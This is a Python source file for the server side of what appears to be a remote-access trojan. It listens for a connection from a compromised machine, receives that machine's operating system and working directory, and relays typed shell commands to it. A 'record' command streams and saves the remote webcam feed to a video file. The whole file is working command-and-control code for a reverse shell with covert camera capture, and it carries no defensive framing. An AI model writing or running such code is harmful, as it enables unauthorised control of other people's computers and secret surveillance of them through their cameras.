import socket, cv2, signal, threading, numpy as np

"""
Server details (Change the IP and Port if needed)
"""
h, p, b, sep = "0.0.0.0", 8080, 1024*128, "<~>"
srv = socket.socket()
srv.bind((h, p))
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.listen(5)
print(f"[*] Listening on {h}:{p} ...")
conn, addr = srv.accept()
print(f"[+] Connection from {addr[0]}:{addr[1]} Received!")
loc = conn.recv(b).decode()
sysinfo = conn.recv(b).decode()
print(f"[+] Operating System: {sysinfo}\n[+] Current Working Dir: {loc}")
cam, out, t = None, None, None

"""
Exit func
"""
def exit_gracefully(sig, frm):
    print('Closing video feed...')
    if t: t.join()
    if cam: cam.release()
    if out: out.release()
    cv2.destroyAllWindows()
    conn.close(); srv.close()
    exit(0)

signal.signal(signal.SIGINT, exit_gracefully)

"""
Video Handler func
"""
def vcap():
    global out
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('output.mp4', fourcc, 30.0, (640, 480))
    while True:
        f_size = int.from_bytes(conn.recv(4), 'little')
        f_data = b''
        while len(f_data) < f_size:
            pkt = conn.recv(min(b, f_size - len(f_data)))
            if not pkt: break
            f_data += pkt
        if not f_data: break
        frame = cv2.imdecode(np.frombuffer(f_data, np.uint8), cv2.IMREAD_COLOR)
        out.write(frame)
        cv2.imshow('Remote Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'): break
    out.release(); cv2.destroyAllWindows()

"""
Prompt Loop
"""
while True:
    cmd = input(f"{loc} $> ").strip()
    if not cmd: continue
    conn.send(cmd.encode())
    if cmd.lower() == "exit": break
    elif cmd.lower() == "record":
        t = threading.Thread(target=vcap); t.start()
        print("Video Capture Intialized.")
    else:
        res, loc = conn.recv(b).decode().split(sep)
        print(res)
if t: t.join()
conn.close(); srv.close()
